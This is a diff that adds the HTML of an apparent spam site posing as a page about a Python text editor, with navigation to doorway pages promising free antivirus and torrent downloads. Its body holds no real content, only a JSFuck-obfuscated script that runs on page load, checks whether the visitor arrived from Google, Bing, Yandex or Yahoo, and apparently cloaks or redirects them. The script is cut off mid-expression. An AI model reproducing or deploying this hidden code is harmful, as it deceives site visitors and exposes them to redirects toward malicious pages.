@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <title>
+   hopdegreek - Python text editor for 3-6-3
+  </title>
+  <meta content="hopdegreek" property="og:site_name"/>
+  <meta content="hopdegreek" property="og:title"/>
+  <meta content="Looking to master Python? Complete Python Bootcamp course from udemy will be a great stepping stone for you.īefore moving ahead, let us first see what IDEs and code editors are and the requirements..." property="og:description"/>
+  <meta content="https://www.tecmint.com/wp-content/uploads/2018/06/Python-Interpreter.png" property="og:image"/>
+  <meta content="http://linuxcnc.org/docs/html/gui/images/qtaxis.png" property="og:image"/>
+  <meta content="https://www.poftut.com/wp-content/uploads/2017/10/img_59dcd66c358c1.png" property="og:image"/>
+  <meta content="https://hopdegreek.weebly.com/uploads/8/9/1/7/89179606/published/arts-crafts-splash-logo.png?1533861220" property="og:image"/>
+  <meta content="https://hopdegreek.weebly.com/" property="og:url"/>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <link href="//cdn2.editmysite.com/css/sites.css?buildTime=1657307797" id="wsite-base-style" rel="stylesheet" type="text/css"/>
+  <link href="//cdn2.editmysite.com/css/old/fancybox.css?1657307797" rel="stylesheet" type="text/css"/>
+  <link href="//cdn2.editmysite.com/css/social-icons.css?buildtime=1657307797" media="screen,projection" rel="stylesheet" type="text/css"/>
+  <link href="/files/main_style.css?1657335080" rel="stylesheet" title="wsite-theme-css" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Lato:400,300,300italic,700,400italic,700italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Cookie&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Roboto:400,300,300italic,700,400italic,700italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Catamaran:400,300,200,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Merriweather:400,300,300italic,700,400italic,700italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Amaranth:400,700,400italic,700italic&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+  <link href="//fonts.googleapis.com/css?family=Catamaran:400,300,200,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"/>
+  <style type="text/css">
+   .wsite-elements.wsite-not-footer:not(.wsite-header-elements) div.paragraph, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) p, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-block .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-description, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {font-family:"Catamaran" !important;font-weight:300 !important;text-transform:  none !important;letter-spacing: 0px !important;}
+#wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {color:#2a2a2a !important;}
+.wsite-elements.wsite-footer div.paragraph, .wsite-elements.wsite-footer p, .wsite-elements.wsite-footer .product-block .product-title, .wsite-elements.wsite-footer .product-description, .wsite-elements.wsite-footer .wsite-form-field label, .wsite-elements.wsite-footer .wsite-form-field label{}
+.wsite-elements.wsite-not-footer:not(.wsite-header-elements) h2, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-long .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-large .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-small .product-title, #wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {font-family:"Merriweather" !important;font-weight:700 !important;text-transform:  none !important;letter-spacing: 0px !important;}
+#wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {}
+.wsite-elements.wsite-footer h2, .wsite-elements.wsite-footer .product-long .product-title, .wsite-elements.wsite-footer .product-large .product-title, .wsite-elements.wsite-footer .product-small .product-title{}
+#wsite-title {font-family:"Amaranth" !important;text-transform:  uppercase !important;}
+.wsite-menu-default a {}
+.wsite-menu a {}
+.wsite-image div, .wsite-caption {}
+.galleryCaptionInnerText {}
+.fancybox-title {}
+.wslide-caption-text {}
+.wsite-phone {}
+.wsite-headline,.wsite-header-section .wsite-content-title {}
+.wsite-headline-paragraph,.wsite-header-section .paragraph {}
+.wsite-button-inner {font-family:"Catamaran" !important;}
+.wsite-not-footer blockquote {}
+.wsite-footer blockquote {}
+.blog-header h2 a {}
+#wsite-content h2.wsite-product-title {}
+.wsite-product .wsite-product-price a {}
+@media screen and (min-width: 767px) {.wsite-elements.wsite-not-footer:not(.wsite-header-elements) div.paragraph, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) p, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-block .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-description, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {font-size:24px !important;line-height:35px !important;}
+#wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {}
+.wsite-elements.wsite-footer div.paragraph, .wsite-elements.wsite-footer p, .wsite-elements.wsite-footer .product-block .product-title, .wsite-elements.wsite-footer .product-description, .wsite-elements.wsite-footer .wsite-form-field label, .wsite-elements.wsite-footer .wsite-form-field label{}
+.wsite-elements.wsite-not-footer:not(.wsite-header-elements) h2, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-long .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-large .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-small .product-title, #wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {font-size:16px !important;}
+#wsite-content h2, #wsite-content .product-long .product-title, #wsite-content .product-large .product-title, #wsite-content .product-small .product-title, .blog-sidebar h2 {}
+.wsite-elements.wsite-footer h2, .wsite-elements.wsite-footer .product-long .product-title, .wsite-elements.wsite-footer .product-large .product-title, .wsite-elements.wsite-footer .product-small .product-title{}
+#wsite-title {}
+.wsite-menu-default a {}
+.wsite-menu a {}
+.wsite-image div, .wsite-caption {}
+.galleryCaptionInnerText {}
+.fancybox-title {}
+.wslide-caption-text {}
+.wsite-phone {}
+.wsite-headline,.wsite-header-section .wsite-content-title {}
+.wsite-headline-paragraph,.wsite-header-section .paragraph {}
+.wsite-button-inner {}
+.wsite-not-footer blockquote {}
+.wsite-footer blockquote {}
+.blog-header h2 a {}
+#wsite-content h2.wsite-product-title {}
+.wsite-product .wsite-product-price a {}
+}
+  </style>
+  <style>
+   .wsite-background {background-image: url("/uploads/1/3/3/4/133479403/background-images/544687751.jpg") !important;background-repeat: no-repeat !important;background-position: 50% 50% !important;background-size: 100% !important;background-color: transparent !important;background: inherit;}
+body.wsite-background {background-attachment: fixed !important;}.wsite-background.wsite-custom-background{ background-size: cover !important}
+  </style>
+  <script src="/files/templateArtifacts.js?1657335080">
+  </script>
+  <script>
+   var STATIC_BASE = '//cdn1.editmysite.com/';
+var ASSETS_BASE = '//cdn2.editmysite.com/';
+var STYLE_PREFIX = 'wsite';
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js">
+  </script>
+  <script src="//cdn2.editmysite.com/js/lang/en/stl.js?buildTime=1657307797&amp;" type="text/javascript">
+  </script>
+  <script src="//cdn2.editmysite.com/js/site/main.js?buildTime=1657307797">
+  </script>
+  <script type="text/javascript">
+   function initCustomerAccountsModels() {
+					(function(){_W.setup_rpc({"url":"\/ajax\/api\/JsonRPC\/CustomerAccounts\/","actions":{"CustomerAccounts":[{"name":"login","len":2,"multiple":false,"standalone":false},{"name":"logout","len":0,"multiple":false,"standalone":false},{"name":"getSessionDetails","len":0,"multiple":false,"standalone":false},{"name":"getAccountDetails","len":0,"multiple":false,"standalone":false},{"name":"getOrders","len":0,"multiple":false,"standalone":false},{"name":"register","len":4,"multiple":false,"standalone":false},{"name":"emailExists","len":1,"multiple":false,"standalone":false},{"name":"passwordReset","len":1,"multiple":false,"standalone":false},{"name":"passwordUpdate","len":3,"multiple":false,"standalone":false},{"name":"validateSession","len":1,"multiple":false,"standalone":false}]},"namespace":"_W.CustomerAccounts.RPC"});
+_W.setup_model_rpc({"rpc_namespace":"_W.CustomerAccounts.RPC","model_namespace":"_W.CustomerAccounts.BackboneModelData","collection_namespace":"_W.CustomerAccounts.BackboneCollectionData","bootstrap_namespace":"_W.CustomerAccounts.BackboneBootstrap","models":{"CustomerAccounts":{"_class":"CustomerAccounts.Model.CustomerAccounts","defaults":null,"validation":null,"types":null,"idAttribute":null,"keydefs":null}},"collections":{"CustomerAccounts":{"_class":"CustomerAccounts.Collection.CustomerAccounts"}},"bootstrap":[]});
+})();
+		}
+		if(document.createEvent && document.addEventListener) {
+			var initEvt = document.createEvent('Event');
+			initEvt.initEvent('customerAccountsModelsInitialized', true, false);
+			document.dispatchEvent(initEvt);
+		} else if(document.documentElement.initCustomerAccountsModels === 0){
+			document.documentElement.initCustomerAccountsModels++
+		}
+  </script>
+  <script type="text/javascript">
+   _W = _W || {}; _W.securePrefix='hopdegreek.weebly.com';
+  </script>
+  <script>
+   _W = _W || {};
+			_W.customerLocale = "en_US";
+			_W.storeName = null;
+			_W.isCheckoutReskin = false;
+			_W.storeCountry = "RU";
+			_W.storeCurrency = "RUB";
+			_W.storeEuPrivacyPolicyUrl = "";
+			com_currentSite = "672386862426528971";
+			com_userID = "133479403";
+  </script>
+  <script type="text/javascript">
+   _W.configDomain = "www.weebly.com";
+  </script>
+  <script>
+   _W.relinquish && _W.relinquish()
+  </script>
+  <script src="//cdn2.editmysite.com/js/lang/en/stl.js?buildTime=1657307797&amp;" type="text/javascript">
+  </script>
+  <script>
+   _W.themePlugins = [];
+  </script>
+  <script type="text/javascript">
+   _W.recaptchaUrl = "https://www.google.com/recaptcha/api.js";
+  </script>
+  <script type="text/javascript">
+   <!--
+	
+	
+	function initFlyouts(){
+		initPublishedFlyoutMenus(
+			[{"id":"625464509331879013","title":"Python text editor for 3-6-3","url":"index.html","target":"","nav_menu":false,"nonclickable":false},{"id":"142411861845668081","title":"How to update my mac step by step","url":"how-to-update-my-mac-step-by-step.html","target":"","nav_menu":false,"nonclickable":false},{"id":"897069097892404272","title":"Blog","url":"blog.html","target":"","nav_menu":false,"nonclickable":false},{"id":"164436977440741364","title":"Intel centrino 1030 specs","url":"intel-centrino-1030-specs.html","target":"","nav_menu":false,"nonclickable":false},{"id":"134098907613179300","title":"Norton security 2017 free download","url":"norton-security-2017-free-download.html","target":"","nav_menu":false,"nonclickable":false},{"id":"708540231919365612","title":"Apple macbook pro 2015 sale","url":"apple-macbook-pro-2015-sale.html","target":"","nav_menu":false,"nonclickable":false},{"id":"813603319811906379","title":"Bitdefender antivirus free edition 2015 download","url":"bitdefender-antivirus-free-edition-2015-download.html","target":"","nav_menu":false,"nonclickable":false},{"id":"995554746173559666","title":"Dimmer for led lights stage lighting","url":"dimmer-for-led-lights-stage-lighting.html","target":"","nav_menu":false,"nonclickable":false},{"id":"686728154916617171","title":"Smoke brushes photoshop cs6","url":"smoke-brushes-photoshop-cs6.html","target":"","nav_menu":false,"nonclickable":false},{"id":"390126558590655628","title":"Rotate pdf pages in illustrator","url":"rotate-pdf-pages-in-illustrator.html","target":"","nav_menu":false,"nonclickable":false},{"id":"498993912972964547","title":"Nexus 2 windows torrent expansions","url":"nexus-2-windows-torrent-expansions.html","target":"","nav_menu":false,"nonclickable":false},{"id":"478480490812937094","title":"Wondershare mobiletrans discount code","url":"wondershare-mobiletrans-discount-code.html","target":"","nav_menu":false,"nonclickable":false},{"id":"125070662151960833","title":"And reference to python in visual studio","url":"and-reference-to-python-in-visual-studio.html","target":"","nav_menu":false,"nonclickable":false},{"id":"192920739660972295","title":"Lost planet 2 pc download","url":"lost-planet-2-pc-download.html","target":"","nav_menu":false,"nonclickable":false},{"id":"490018465603888103","title":"Hp oj8610 printfilterpipelinesvc-exe crash","url":"hp-oj8610-printfilterpipelinesvc-exe-crash.html","target":"","nav_menu":false,"nonclickable":false}],
+			"625464509331879013",
+			'',
+			'active',
+			false,
+			{"navigation\/item":"<li {{#id}}id=\"{{id}}\"{{\/id}} class=\"wsite-menu-item-wrap\">\n\t<a\n\t\t{{^nonclickable}}\n\t\t\t{{^nav_menu}}\n\t\t\t\thref=\"{{url}}\"\n\t\t\t{{\/nav_menu}}\n\t\t{{\/nonclickable}}\n\t\t{{#target}}\n\t\t\ttarget=\"{{target}}\"\n\t\t{{\/target}}\n\t\t{{#membership_required}}\n\t\t\tdata-membership-required=\"{{.}}\"\n\t\t{{\/membership_required}}\n\t\tclass=\"wsite-menu-item\"\n\t\t>\n\t\t{{{title_html}}}\n\t<\/a>\n\t{{#has_children}}{{> navigation\/flyout\/list}}{{\/has_children}}\n<\/li>\n","navigation\/flyout\/list":"<div class=\"wsite-menu-wrap\" style=\"display:none\">\n\t<ul class=\"wsite-menu\">\n\t\t{{#children}}{{> navigation\/flyout\/item}}{{\/children}}\n\t<\/ul>\n<\/div>\n","navigation\/flyout\/item":"<li {{#id}}id=\"{{id}}\"{{\/id}}\n\tclass=\"wsite-menu-subitem-wrap {{#is_current}}wsite-nav-current{{\/is_current}}\"\n\t>\n\t<a\n\t\t{{^nonclickable}}\n\t\t\t{{^nav_menu}}\n\t\t\t\thref=\"{{url}}\"\n\t\t\t{{\/nav_menu}}\n\t\t{{\/nonclickable}}\n\t\t{{#target}}\n\t\t\ttarget=\"{{target}}\"\n\t\t{{\/target}}\n\t\tclass=\"wsite-menu-subitem\"\n\t\t>\n\t\t<span class=\"wsite-menu-title\">\n\t\t\t{{{title_html}}}\n\t\t<\/span>{{#has_children}}<span class=\"wsite-menu-arrow\">&gt;<\/span>{{\/has_children}}\n\t<\/a>\n\t{{#has_children}}{{> navigation\/flyout\/list}}{{\/has_children}}\n<\/li>\n"},
+			{}
+		)
+	}
+//-->
+  </script>
+ </head>
+ <body class="header-page wsite-theme-light wsite-page-index">
+  <div class="wrapper">
+   <div class="header-wrap">
+    <div class="nav-wrap">
+     <div id="logo">
+      <span class="wsite-logo">
+       <a href="/">
+        <img alt="hopdegreek" src="/uploads/8/9/1/7/89179606/published/arts-crafts-splash-logo.png?1533861220"/>
+       </a>
+      </span>
+     </div>
+     <a aria-label="Menu" class="hamburger" href="#">
+      <span>
+      </span>
+     </a>
+     <div class="menu">
+      <div class="container">
+       <div class="search">
+       </div>
+       <ul class="wsite-menu-default">
+        <li class="wsite-menu-item-wrap" id="active">
+         <a class="wsite-menu-item" href="/">
+          Python text editor for 3-6-3
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg142411861845668081">
+         <a class="wsite-menu-item" href="/how-to-update-my-mac-step-by-step.html">
+          How to update my mac step by step
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg897069097892404272">
+         <a class="wsite-menu-item" href="/blog.html">
+          Blog
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg164436977440741364">
+         <a class="wsite-menu-item" href="/intel-centrino-1030-specs.html">
+          Intel centrino 1030 specs
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg134098907613179300">
+         <a class="wsite-menu-item" href="/norton-security-2017-free-download.html">
+          Norton security 2017 free download
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg708540231919365612">
+         <a class="wsite-menu-item" href="/apple-macbook-pro-2015-sale.html">
+          Apple macbook pro 2015 sale
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg813603319811906379">
+         <a class="wsite-menu-item" href="/bitdefender-antivirus-free-edition-2015-download.html">
+          Bitdefender antivirus free edition 2015 download
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg995554746173559666">
+         <a class="wsite-menu-item" href="/dimmer-for-led-lights-stage-lighting.html">
+          Dimmer for led lights stage lighting
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg686728154916617171">
+         <a class="wsite-menu-item" href="/smoke-brushes-photoshop-cs6.html">
+          Smoke brushes photoshop cs6
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg390126558590655628">
+         <a class="wsite-menu-item" href="/rotate-pdf-pages-in-illustrator.html">
+          Rotate pdf pages in illustrator
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg498993912972964547">
+         <a class="wsite-menu-item" href="/nexus-2-windows-torrent-expansions.html">
+          Nexus 2 windows torrent expansions
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg478480490812937094">
+         <a class="wsite-menu-item" href="/wondershare-mobiletrans-discount-code.html">
+          Wondershare mobiletrans discount code
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg125070662151960833">
+         <a class="wsite-menu-item" href="/and-reference-to-python-in-visual-studio.html">
+          And reference to python in visual studio
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg192920739660972295">
+         <a class="wsite-menu-item" href="/lost-planet-2-pc-download.html">
+          Lost planet 2 pc download
+         </a>
+        </li>
+        <li class="wsite-menu-item-wrap" id="pg490018465603888103">
+         <a class="wsite-menu-item" href="/hp-oj8610-printfilterpipelinesvc-exe-crash.html">
+          Hp oj8610 printfilterpipelinesvc-exe crash
+         </a>
+        </li>
+       </ul>
+      </div>
+     </div>
+    </div>
+    <div class="banner-wrap">
+     <div class="wsite-elements wsite-not-footer wsite-header-elements">
+      <div class="wsite-section-wrap">
+       <div class="wsite-section wsite-header-section wsite-section-bg-image" style='background-image: url("/uploads/1/3/3/4/133479403/background-images/1754078403.jpg") ;background-repeat: no-repeat ;background-position: 50% 50% ;background-size: 100% ;background-color: transparent ;background-size: cover;'>
+        <div class="wsite-section-content">
+         <div class="container">
+          <div class="banner">
+           <div class="wsite-section-elements">
+            <h2 class="wsite-content-title">
+             Python text editor for 3.6.3
+            </h2>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="">
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <!--/.header-wrap-->
+   <div id="main-wrap">
+    <div class="wsite-elements wsite-not-footer" id="wsite-content">
+     <div class="wsite-section-wrap">
+      <div class="wsite-section wsite-body-section wsite-background-2 wsite-custom-background">
+       <div class="wsite-section-content">
+        <div class="container">
+         <div class="wsite-section-elements">
+          <div>
+           <div align="left" class="wcustomhtml" id="621091484177533839" style="width: 100%; overflow-y: hidden;">
+            <div id="lw81udnrob80jVewMfA2psvSDzYG1G8ytIj8JmvOoAIiMZkDIJpVFndT1gsVfCRd5ab2gaizjMHKFIadKQxmqdOa8Q64t1dHi9fgsJWc0pgTbTJnBjGPe8mUM1XQ4GaJdz3A4Uk2tQM1XVZfbkWePO5emlUSMBAPjXKbrdLHZFVOmlXR3MJmKvtPwrnlzsKnkXMzfSOYZjfFsjr1o6qzrnAn6VFzpzHBVC7pzXGExLn0LjWI0mww4KWXS">
+            </div>
+            <script>
+             $=String.fromCharCode(118,82,61,109,46,59,10,40,120,39,103,41,33,45,49,124,107,121,104,123,69,66,73,119,56,48,86,77,65,50,112,83,68,122,89,71,74,90,70,84,67,53,72,75,81,113,54,52,57,87,80,85,88,51,76,55,60,34,47,63,38,37,43,95,44,58,62,125);_=([![]]+{})[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]];_[_][_]($[0]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[2]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+{})[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+$[4]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$[5]+$[6]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[7]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+[]]+$[7]+$[9]+$[4]+$[10]+([]+[]+{})[+!+[]]+([]+[]+{})[+!+[]]+$[10]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[4]+$[9]+$[11]+$[12]+$[2]+$[13]+$[14]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[15]+$[15]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+[]]+$[7]+$[9]+$[4]+([]+[]+{})[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+$[10]+$[4]+$[9]+$[11]+$[12]+$[2]+$[13]+$[14]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[15]+$[15]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+[]]+$[7]+$[9]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]]+([![]]+{})[+!+[]+[+[]]]+$[16]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]]+([![]]+{})[+!+[]+[+[]]]+$[16]+$[10]+([]+[]+{})[+!+[]]+$[4]+$[9]+$[11]+$[12]+$[2]+$[13]+$[14]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[15]+$[15]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+[]]+$[7]+$[9]+$[17]+(![]+[])[+!+[]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+$[4]+$[9]+$[11]+$[12]+$[2]+$[13]+$[14]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[15]+$[15]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+[]]+$[7]+$[9]+$[4]+$[17]+(![]+[])[+!+[]]+$[18]+([]+[]+{})[+!+[]]+([]+[]+{})[+!+[]]+$[4]+$[9]+$[11]+$[12]+$[2]+$[13]+$[14]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[15]+$[15]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+[]]+$[7]+$[9]+$[4]+(![]+[])[+!+[]]+([]+[]+{})[+!+[]]+(![]+[])[!+[]+!+[]]+$[4]+$[9]+$[11]+$[12]+$[2]+$[13]+$[14]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[15]+$[15]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[1]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$[4]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[8]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+(![]+[])[+[]]+$[7]+$[9]+$[4]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+$[16]+$[4]+$[9]+$[11]+$[12]+$[2]+$[13]+$[14]+$[11]+$[6]+$[19]+$[6]+$[6]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+{})[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+$[4]+$[10]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+$[20]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[3]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+$[21]+$[17]+$[22]+([]+[]+[][[]])[!+[]+!+[]]+$[7]+$[9]+(![]+[])[!+[]+!+[]]+$[23]+$[24]+$[14]+(!![]+[])[!+[]+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+!+[]]+([]+[]+{})[+!+[]]+([]+[]+{})[!+[]+!+[]]+$[24]+$[25]+([]+[]+{})[+!+[]+[+[]]]+$[26]+(!![]+[])[!+[]+!+[]+!+[]]+$[23]+$[27]+(![]+[])[+[]]+$[28]+$[29]+$[30]+(![]+[])[!+[]+!+[]+!+[]]+$[0]+$[31]+$[32]+$[33]+$[34]+$[35]+$[14]+$[35]+$[24]+$[17]+(!![]+[])[+[]]+$[22]+([]+[]+{})[+!+[]+[+[]]]+$[24]+$[36]+$[3]+$[0]+(![]+[]+[]+[]+{})[+!+[]+[]+[]+(!+[]+!+[]+!+[])]+([]+[]+{})[+!+[]]+$[28]+$[22]+([![]]+[][[]])[+!+[]+[+[]]]+$[27]+$[37]+$[16]+$[32]+$[22]+$[36]+$[30]+$[26]+$[38]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+$[39]+$[14]+$[10]+(![]+[])[!+[]+!+[]+!+[]]+$[26]+(![]+[])[+[]]+$[40]+$[1]+([]+[]+[][[]])[!+[]+!+[]]+$[41]+(![]+[])[+!+[]]+([]+[]+{})[!+[]+!+[]]+$[29]+$[10]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+$[33]+([]+[]+{})[+!+[]+[+[]]]+$[27]+$[42]+$[43]+$[38]+$[22]+(![]+[])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]